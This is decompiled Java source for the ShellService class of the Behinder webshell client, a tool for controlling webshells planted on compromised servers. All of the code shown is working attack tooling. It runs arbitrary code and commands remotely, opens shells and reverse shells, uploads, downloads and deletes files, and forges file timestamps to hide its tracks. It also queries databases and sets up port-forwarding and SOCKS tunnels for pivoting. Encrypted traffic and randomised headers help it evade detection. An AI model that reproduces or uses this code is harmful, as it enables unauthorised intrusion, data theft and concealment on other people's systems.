/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package net.rebeyond.behinder.core;

import java.io.FileOutputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javafx.application.Platform;
import javafx.scene.control.Alert;
import javafx.stage.Window;
import javax.crypto.IllegalBlockSizeException;
import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.Crypt;
import net.rebeyond.behinder.core.CustomCryptor;
import net.rebeyond.behinder.core.ICrypt;
import net.rebeyond.behinder.core.IShellService;
import net.rebeyond.behinder.core.LegacyCryptor;
import net.rebeyond.behinder.entity.BShell;
import net.rebeyond.behinder.entity.DecryptException;
import net.rebeyond.behinder.service.OfflineHelper;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;

public class ShellService
implements IShellService {
    public String currentUrl;
    public String currentPassword;
    public String currentKey;
    public String currentType;
    public String childType;
    public String effectType;
    public Map<String, String> currentHeaders;
    public Map<String, Map<String, String>> scriptHeaders;
    public int encryptType = Constants.ENCRYPT_TYPE_AES;
    private int compareMode = 0;
    public int beginIndex = 0;
    public int endIndex = 0;
    public byte[] prefixBytes;
    public byte[] suffixBytes;
    public JSONObject shellEntity;
    public static int BUFFSIZE = 46080;
    public static Map<String, Object> currentProxy;
    private boolean needTransfer = false;
    private BShell currentBShell;
    private JSONObject effectShellEntity;
    private OfflineHelper offlineHelper;
    private String sessionId;
    private ICrypt cryptor;
    private List<Map<String, Object>> childList;
    private List<JSONObject> shellChains = new ArrayList<JSONObject>();

    @Override
    public ICrypt getCryptor() {
        return this.cryptor;
    }

    @Override
    public List<Map<String, Object>> getChildList() {
        return this.childList;
    }

    @Override
    public void setChildList(List<Map<String, Object>> childList) {
        this.childList = childList;
    }

    @Override
    public JSONObject getEffectShellEntity() {
        return this.effectShellEntity;
    }

    private ICrypt getCryptor(int transProtocolId) {
        ICrypt cryptor = null;
        if (transProtocolId >= 0) {
            try {
                cryptor = new CustomCryptor(transProtocolId, Utils.getKey("rebeyond"));
                cryptor.getDecodeClsBytes();
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            try {
                cryptor = new LegacyCryptor(this.effectType, this.encryptType, this.currentKey);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return cryptor;
    }

    private void init() {
        if (this.effectType.equals("aspx")) {
            this.sessionId = Utils.getRandomAlpha(16);
        }
    }

    public ShellService(JSONObject shellEntity) throws Exception {
        this.shellEntity = shellEntity;
        this.effectShellEntity = shellEntity;
        this.currentUrl = shellEntity.getString("url");
        this.currentType = shellEntity.getString("type");
        this.currentPassword = shellEntity.getString("password");
        this.currentKey = Utils.getKey(this.currentPassword);
        this.currentHeaders = new HashMap<String, String>();
        this.effectType = this.currentType;
        this.cryptor = this.getCryptor(shellEntity.getInt("transProtocolId"));
        try {
            this.offlineHelper = new OfflineHelper(shellEntity.getInt("id"));
        } catch (Exception e) {
            System.out.println("\u79bb\u7ebf\u6a21\u5757\u521d\u59cb\u5316\u5931\u8d25\uff1a" + e.getMessage());
        }
        this.init();
        this.initHeaders();
        this.mergeHeaders(this.currentHeaders, shellEntity.optString("headers", ""));
    }

    public ShellService(JSONObject shellEntity, List<Map<String, Object>> childList) throws Exception {
        this.shellEntity = shellEntity;
        this.currentUrl = shellEntity.getString("url");
        this.currentType = shellEntity.getString("type");
        this.currentPassword = shellEntity.getString("password");
        this.currentHeaders = new HashMap<String, String>();
        this.needTransfer = true;
        this.childList = childList;
        this.shellChains.add(shellEntity);
        for (Map<String, Object> childObj : childList) {
            JSONObject childShellEntity = (JSONObject)childObj.get("childShellEntity");
            this.shellChains.add(childShellEntity);
            String scriptType = childShellEntity.getString("type");
            this.scriptHeaders = new HashMap<String, Map<String, String>>();
            HashMap<String, String> scriptHeader = new HashMap<String, String>();
            this.initHeardersByType(scriptType, scriptHeader);
            this.scriptHeaders.put(scriptType, scriptHeader);
        }
        this.effectShellEntity = (JSONObject)((Map)Utils.getLastOfList(childList)).get("childShellEntity");
        this.effectType = this.effectShellEntity.getString("type");
        this.currentBShell = (BShell)this.effectShellEntity.get("bShell");
        this.cryptor = this.getCryptor(shellEntity.getInt("transProtocolId"));
        this.offlineHelper = new OfflineHelper(shellEntity.getInt("id"));
        this.init();
        this.initHeaders();
        this.mergeHeaders(this.currentHeaders, shellEntity.optString("headers", ""));
    }

    private void initHeardersByType(String type, Map<String, String> headers) {
        if (type.equals("php")) {
            headers.put("Content-type", "application/x-www-form-urlencoded");
        } else if (type.equals("aspx")) {
            headers.put("Content-Type", "application/octet-stream");
        } else if (type.equals("jsp")) {
            // empty if block
        }
        this.initHeardersCommon(type, headers);
    }

    private void initHeardersCommon(String type, Map<String, String> headers) {
        headers.put("Accept", this.getCurrentAccept());
        headers.put("Accept-Language", this.AcceptLanguage());
        headers.put("User-Agent", this.getCurrentUserAgent());
        if (headers.get("User-Agent").toLowerCase().indexOf("firefox") >= 0) {
            // empty if block
        }
        //headers.put("Referer", this.getReferer());
    }

    private void initHeaders() {
        this.initHeardersByType(this.currentType, this.currentHeaders);
    }

    private String getReferer() {
        String refer;
        URL u = null;
        try {
            u = new URL(this.effectShellEntity.getString("url"));
            String oldPath = u.getPath();
            String newPath = "";
            String ext = oldPath.substring(oldPath.lastIndexOf("."));
            oldPath = oldPath.substring(0, oldPath.lastIndexOf("."));
            String[] parts = oldPath.split("/");
            for (int i = 0; i < parts.length; ++i) {
                if (parts[i].length() == 0) continue;
                if (new Random().nextBoolean()) {
                    int randomNum = new Random().nextInt(parts[i].length());
                    if (randomNum == 0) {
                        randomNum = 4;
                    }
                    String randStr = new Random().nextBoolean() ? Utils.getRandomString(randomNum).toLowerCase() : Utils.getRandomString(randomNum).toUpperCase();
                    newPath = newPath + "/" + randStr;
                    continue;
                }
                newPath = newPath + "/" + parts[i];
            }
            newPath = newPath + ext;
            refer = this.currentUrl.replace(u.getPath(), newPath);
        } catch (Exception e) {
            return this.currentUrl;
        }
        return refer;
    }

    private String getCurrentUserAgent() {
        int uaIndex = new Random().nextInt(Constants.userAgents.length - 1);
        String currentUserAgent = Constants.userAgents[uaIndex];
        return currentUserAgent;
    }

    private String getCurrentAccept() {
        int acIndex = new Random().nextInt(Constants.accepts.length);
        String currentAccept = Constants.accepts[acIndex];
        return currentAccept;
    }

    private String AcceptLanguage() {
        int acIndex = new Random().nextInt(Constants.AcceptLanguage.length);
        String AcceptLanguage = Constants.AcceptLanguage[acIndex];
        return AcceptLanguage;
    }

    @Override
    public void setProxy(Map<String, Object> proxy) {
        currentProxy = proxy;
    }

    @Override
    public Map<String, Object> getProxy(Map<String, Object> proxy) {
        return currentProxy;
    }

    @Override
    public JSONObject getShellEntity() {
        return this.shellEntity;
    }

    private void mergeHeaders(Map<String, String> headers, String headerTxt) {
        for (String line : headerTxt.split("\n")) {
            int semiIndex = line.indexOf(":");
            if (semiIndex <= 0) continue;
            String key = line.substring(0, semiIndex);
            key = this.formatHeaderName(key);
            String value = line.substring(semiIndex + 1);
            if (value.equals("")) continue;
            headers.put(key, value);
        }
    }

    private String formatHeaderName(String beforeName) {
        String afterName = "";
        for (String element : beforeName.split("-")) {
            element = (element.charAt(0) + "").toUpperCase() + element.substring(1).toLowerCase();
            afterName = afterName + element + "-";
        }
        if (afterName.length() - beforeName.length() == 1 && afterName.endsWith("-")) {
            afterName = afterName.substring(0, afterName.length() - 1);
        }
        return afterName;
    }

    @Override
    public boolean doConnect() throws Exception {
        boolean result = false;
        int randStringLength = new SecureRandom().nextInt(3000);
        String content = Utils.getRandomString(randStringLength);
        JSONObject obj = null;
        try {
            obj = this.echo(content);
        } catch (DecryptException e) {
            if (this.effectType.equals("php") && !this.cryptor.isCustomized()) {
                this.encryptType = Constants.ENCRYPT_TYPE_XOR;
                this.cryptor = this.getCryptor(-1);
                obj = this.echo(content);
            }
            throw e;
        }
        if (obj.getString("msg").equals(content)) {
            result = true;
        }
        return result;
    }

    @Override
    public String evalWithTransProtocol(String sourceCode) throws Exception {
        String result = null;
        byte[] payload = null;
        payload = this.effectType.equals("jsp") ? Utils.getClassFromSourceCode(sourceCode) : sourceCode.getBytes();
        byte[] data = Utils.getEvalDataWithTransprotocol(this.cryptor, this.currentKey, this.effectType, payload);
        Map<String, Object> resultObj = this.doRequestAndParse(data);
        byte[] resData = (byte[])resultObj.get("data");
        result = new String(resData);
        HashMap<String, String> params = new HashMap<String, String>();
        params.put("sourceCode", sourceCode);
        JSONObject evalResult = new JSONObject();
        evalResult.put("msg", result);
        evalResult.put("status", "success");
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, evalResult);
        return result;
    }

    @Override
    public String eval(String sourceCode) throws Exception {
        String result = null;
        byte[] payload = null;
        if (this.effectType.equals("jsp")) {
            payload = Utils.getClassFromSourceCode(sourceCode);
            payload[7] = 49;
        } else {
            payload = sourceCode.getBytes();
        }
        byte[] data = Utils.getEvalData(this.cryptor, this.effectType, payload);
        Map<String, Object> resultObj = this.doRequestAndParse(data);
        byte[] resData = (byte[])resultObj.get("data");
        result = new String(resData);
        HashMap<String, String> params = new HashMap<String, String>();
        params.put("sourceCode", sourceCode);
        JSONObject evalResult = new JSONObject();
        evalResult.put("msg", result);
        evalResult.put("status", "success");
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, evalResult);
        return result;
    }

    @Override
    public JSONObject runCmd(String cmd, String path) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", cmd);
        params.put("path", path);
        JSONObject result = this.parseCommonAction("Cmd", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject createBShell(String target) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "create");
        params.put("target", target);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    @Override
    public JSONObject listBShell() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "list");
        JSONObject result = this.parseCommonAction("BShell", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject listReverseBShell() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "listReverse");
        JSONObject result = this.parseCommonAction("BShell", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject listenBShell(String listenPort) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "listen");
        params.put("listenPort", listenPort);
        JSONObject result = this.parseCommonAction("BShell", params);
        return result;
    }

    @Override
    public JSONObject closeBShell(String target, String type) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "close");
        params.put("target", target);
        params.put("type", type);
        JSONObject result = this.parseCommonAction("BShell", params);
        return result;
    }

    @Override
    public JSONObject stopReverseBShell() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "stopReverse");
        JSONObject result = this.parseCommonAction("BShell", params);
        return result;
    }

    @Override
    public JSONObject sendBShellCommand(String target, String action, String actionParams) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", action);
        params.put("target", target);
        params.put("params", actionParams);
        JSONObject result = this.parseCommonAction("BShell", params);
        return result;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public JSONObject submitPluginTask(String taskID, String payloadPath, Map<String, String> pluginParams) throws Exception {
        JSONObject result;
        byte[] pluginData = Utils.getPluginData(this.currentKey, payloadPath, pluginParams, this.currentType);
        String payload = Base64.getEncoder().encodeToString(pluginData);
        HashMap<String, String> params = new HashMap<String, String>();
        params.put("taskID", taskID);
        params.put("action", "submit");
        params.put("payload", payload);
        int blockSize = 65535;
        if (this.effectType.equals("php")) {
            String oldAcceptEncoding = "";
            if (this.currentHeaders.containsKey("Accept-Encoding")) {
                oldAcceptEncoding = this.currentHeaders.get("Accept-Encoding");
            }
            this.currentHeaders.put("Accept-Encoding", "identity");
            try {
                result = this.parseCommonAction("Plugin", params);
            } catch (Exception e) {
                result = new JSONObject();
                result.put("status", "success");
                result.put("msg", "ok");
            } finally {
                if (!oldAcceptEncoding.equals("")) {
                    this.currentHeaders.put("Accept-Encoding", oldAcceptEncoding);
                } else {
                    this.currentHeaders.remove("Accept-Encoding");
                }
            }
        } else if (this.effectType.equals("jsp") && payload.length() > blockSize) {
            int count = payload.length() / blockSize;
            int remaining = payload.length() % blockSize;
            for (int i = 0; i < count; ++i) {
                params.put("payload", payload.substring(i * blockSize, i * blockSize + blockSize));
                params.put("action", "append");
                result = this.parseCommonAction("Plugin", params);
                if (result.getString("status").equals("success")) continue;
                throw new Exception("\u63d2\u4ef6\u4e0a\u4f20\u5931\u8d25\u3002");
            }
            if (remaining > 0) {
                params.put("payload", payload.substring(count * blockSize, count * blockSize + remaining));
                params.put("action", "append");
                result = this.parseCommonAction("Plugin", params);
                if (!result.getString("status").equals("success")) {
                    throw new Exception("\u63d2\u4ef6\u4e0a\u4f20\u5931\u8d25\u3002");
                }
            }
            params.put("action", "submit");
            params.put("payload", "");
            result = this.parseCommonAction("Plugin", params);
        } else {
            result = this.parseCommonAction("Plugin", params);
        }
        return result;
    }

    @Override
    public JSONObject execPluginTask(String taskID, String payloadPath, Map<String, String> pluginParams) throws Exception {
        byte[] pluginData = Utils.getPluginData(this.currentKey, payloadPath, pluginParams, this.currentType);
        HashMap<String, String> params = new HashMap<String, String>();
        params.put("taskID", taskID);
        params.put("action", "exec");
        params.put("payload", Base64.getEncoder().encodeToString(pluginData));
        JSONObject result = this.parseCommonAction("Plugin", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject getPluginTaskResult(String taskID) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("taskID", taskID);
        params.put("action", "getResult");
        JSONObject result = this.parseCommonAction("Plugin", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject stopPluginTask(String taskID) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("taskID", taskID);
        params.put("action", "stop");
        JSONObject result = this.parseCommonAction("Plugin", params);
        return result;
    }

    @Override
    public JSONObject loadJar(String libPath) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("libPath", libPath);
        JSONObject result = this.parseCommonAction("Loader", params);
        return result;
    }

    @Override
    public JSONObject createRealCMD(String bashPath) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "create");
        params.put("bashPath", bashPath);
        if (this.currentType.equals("php")) {
            params.put("cmd", "");
        }
        params.put("whatever", Utils.getWhatever());
        JSONObject result = this.parseCommonAction("RealCMD", params);
        return result;
    }

    @Override
    public JSONObject stopRealCMD() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "stop");
        if (this.currentType.equals("php")) {
            params.put("bashPath", "");
            params.put("cmd", "");
        }
        params.put("whatever", Utils.getWhatever());
        JSONObject result = this.parseCommonAction("RealCMD", params);
        return result;
    }

    @Override
    public JSONObject readRealCMD() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "read");
        if (this.currentType.equals("php")) {
            params.put("bashPath", "");
            params.put("cmd", "");
        }
        params.put("whatever", Utils.getWhatever());
        JSONObject result = this.parseCommonAction("RealCMD", params);
        return result;
    }

    @Override
    public JSONObject writeRealCMD(String cmd) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "write");
        if (this.currentType.equals("php")) {
            params.put("bashPath", "");
        }
        params.put("cmd", Base64.getEncoder().encodeToString(cmd.getBytes()));
        JSONObject result = this.parseCommonAction("RealCMD", params);
        return result;
    }

    @Override
    public JSONObject listFiles(String path) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "list");
        params.put("path", path);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject checkFileHash(String path, String hash) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "check");
        params.put("path", path);
        params.put("hash", hash);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject getTimeStamp(String path) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "getTimeStamp");
        params.put("path", path);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject updateTimeStamp(String path, String createTimeStamp, String modifyTimeStamp, String accessTimeStamp) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "updateTimeStamp");
        params.put("path", path);
        params.put("createTimeStamp", createTimeStamp);
        params.put("accessTimeStamp", accessTimeStamp);
        params.put("modifyTimeStamp", modifyTimeStamp);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    @Override
    public JSONObject updateModifyTimeStamp(String path, String modifyTimeStamp) throws Exception {
        return this.updateTimeStamp(path, "", modifyTimeStamp, "");
    }

    @Override
    public JSONObject deleteFile(String path) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "delete");
        params.put("path", path);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    @Override
    public JSONObject compress(String path) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "compress");
        params.put("path", path);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    @Override
    public JSONObject showFile(String path, String charset) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "show");
        params.put("path", path);
        if (this.currentType.equals("php")) {
            params.put("content", "");
        } else if (this.currentType.equals("asp")) {
            // empty if block
        }
        if (charset != null) {
            params.put("charset", charset);
        }
        JSONObject result = this.parseCommonAction("FileOperation", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject checkFileExist(String path) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "checkExist");
        params.put("path", path);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject renameFile(String oldName, String newName) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "rename");
        params.put("path", oldName);
        if (this.currentType.equals("php")) {
            params.put("content", "");
            params.put("charset", "");
        }
        params.put("newPath", newName);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    @Override
    public JSONObject createFile(String fileName) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "createFile");
        params.put("path", fileName);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    @Override
    public JSONObject createDirectory(String dirName) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "createDirectory");
        params.put("path", dirName);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    @Override
    public void downloadFile(String remotePath, String localPath) throws Exception {
        byte[] fileContent = null;
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "download");
        params.put("path", remotePath);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        fileContent = (byte[])Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data");
        FileOutputStream fso = new FileOutputStream(localPath);
        fso.write(fileContent);
        fso.flush();
        fso.close();
    }

    @Override
    public JSONObject execSQL(String type, String host, String port, String user, String pass, String database, String sql) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", type);
        params.put("host", host);
        params.put("port", port);
        params.put("user", user);
        params.put("pass", pass);
        params.put("database", database);
        params.put("sql", sql);
        JSONObject result = this.parseCommonAction("Database", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    @Override
    public JSONObject uploadFile(String remotePath, byte[] fileContent, boolean useBlock) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        JSONObject result = null;
        if (!useBlock) {
            params.put("mode", "create");
            params.put("path", remotePath);
            params.put("content", Base64.getEncoder().encodeToString(fileContent));
            result = this.parseCommonAction("FileOperation", params);
        } else {
            List<byte[]> blocks = Utils.splitBytes(fileContent, BUFFSIZE);
            for (int i = 0; i < blocks.size(); ++i) {
                if (i == 0) {
                    params.put("mode", "create");
                } else {
                    params.put("mode", "append");
                }
                params.put("path", remotePath);
                params.put("content", Base64.getEncoder().encodeToString(blocks.get(i)));
                byte[] data = Utils.getData(this.cryptor, "FileOperation", params, this.currentType);
                Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
                byte[] resData = (byte[])resultObj.get("data");
                String resultTxt = new String(this.cryptor.decrypt(resData));
                result = new JSONObject(resultTxt);
                for (String key : result.keySet()) {
                    result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
                }
            }
        }
        return result;
    }

    @Override
    public JSONObject uploadFile(String remotePath, byte[] fileContent) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "create");
        params.put("path", remotePath);
        params.put("content", Base64.getEncoder().encodeToString(fileContent));
        byte[] data = Utils.getData(this.cryptor, "FileOperation", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(this.cryptor.decrypt(resData));
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    @Override
    public JSONObject appendFile(String remotePath, byte[] fileContent) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "append");
        params.put("path", remotePath);
        params.put("content", Base64.getEncoder().encodeToString(fileContent));
        byte[] data = Utils.getData(this.cryptor, "FileOperation", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(this.cryptor.decrypt(resData));
        JSONObject result = new JSONObject(resultTxt);
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    @Override
    public JSONObject uploadFilePart(String remotePath, byte[] fileContent, long blockIndex, long blockSize) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "update");
        params.put("path", remotePath);
        params.put("blockIndex", blockIndex + "");
        params.put("blockSize", blockSize + "");
        params.put("content", Base64.getEncoder().encodeToString(fileContent));
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    @Override
    public JSONObject downFilePart(String remotePath, long blockIndex, long blockSize) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "downloadPart");
        params.put("path", remotePath);
        params.put("blockIndex", blockIndex + "");
        params.put("blockSize", blockSize + "");
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    @Override
    public boolean checkClassExist(String className) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "checkClassExist");
        params.put("className", className);
        JSONObject result = this.parseCommonAction("Utils", params);
        if (result.getString("status").equals("success")) {
            return result.getBoolean("msg");
        }
        throw new Exception(result.getString("msg"));
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public JSONObject createRemotePortMap(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
        JSONObject result;
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        if (this.effectType.equals("php")) {
            String oldAcceptEncoding = "";
            if (this.currentHeaders.containsKey("Accept-Encoding")) {
                oldAcceptEncoding = this.currentHeaders.get("Accept-Encoding");
            }
            this.currentHeaders.put("Accept-Encoding", "identity");
            try {
                result = this.parseCommonAction("PortMap", params);
            } catch (Exception e) {
                result = new JSONObject();
                result.put("status", "success");
                result.put("msg", "ok");
            } finally {
                if (!oldAcceptEncoding.equals("")) {
                    this.currentHeaders.put("Accept-Encoding", oldAcceptEncoding);
                } else {
                    this.currentHeaders.remove("Accept-Encoding");
                }
            }
        } else {
            result = this.parseCommonAction("PortMap", params);
        }
        return result;
    }

    @Override
    public JSONObject createRemoteSocks(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        JSONObject result = this.parseCommonAction("PortMap", params);
        return result;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public JSONObject createVPSSocks(String remoteIP, String remotePort) throws Exception {
        JSONObject result;
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "create");
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        if (this.effectType.equals("php")) {
            String oldAcceptEncoding = "";
            if (this.currentHeaders.containsKey("Accept-Encoding")) {
                oldAcceptEncoding = this.currentHeaders.get("Accept-Encoding");
            }
            this.currentHeaders.put("Accept-Encoding", "identity");
            try {
                result = this.parseCommonAction("RemoteSocksProxy", params);
            } catch (Exception e) {
                result = new JSONObject();
                result.put("status", "success");
                result.put("msg", "ok");
            } finally {
                if (!oldAcceptEncoding.equals("")) {
                    this.currentHeaders.put("Accept-Encoding", oldAcceptEncoding);
                } else {
                    this.currentHeaders.remove("Accept-Encoding");
                }
            }
        } else {
            result = this.parseCommonAction("RemoteSocksProxy", params);
        }
        return result;
    }

    @Override
    public JSONObject stopVPSSocks() throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "stop");
        JSONObject result = this.parseCommonAction("RemoteSocksProxy", params);
        return result;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public JSONObject createPortMap(String targetIP, String targetPort, String socketHash) throws Exception {
        JSONObject result;
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "createLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        if (this.effectType.equals("php")) {
            String oldAcceptEncoding = "";
            if (this.currentHeaders.containsKey("Accept-Encoding")) {
                oldAcceptEncoding = this.currentHeaders.get("Accept-Encoding");
            }
            this.currentHeaders.put("Accept-Encoding", "identity");
            try {
                result = this.parseCommonAction("PortMap", params);
            } catch (Exception e) {
                result = new JSONObject();
                result.put("status", "success");
                result.put("msg", "ok");
            } finally {
                if (!oldAcceptEncoding.equals("")) {
                    this.currentHeaders.put("Accept-Encoding", oldAcceptEncoding);
                } else {
                    this.currentHeaders.remove("Accept-Encoding");
                }
            }
        } else {
            result = this.parseCommonAction("PortMap", params);
        }
        return result;
    }

    @Override
    public JSONObject readPortMapData(String targetIP, String targetPort, String socketHash) throws Exception {
        Object resData = null;
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "read");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("PortMap", params);
        return result;
    }

    @Override
    public JSONObject writePortMapData(byte[] proxyData, String targetIP, String targetPort, String socketHash) throws Exception {
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "write");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        if (this.currentType.equals("php")) {
            params.put("remoteIP", "");
            params.put("remotePort", "");
        }
        params.put("extraData", Base64.getEncoder().encodeToString(proxyData));
        JSONObject result = this.parseCommonAction("PortMap", params);
        return result;
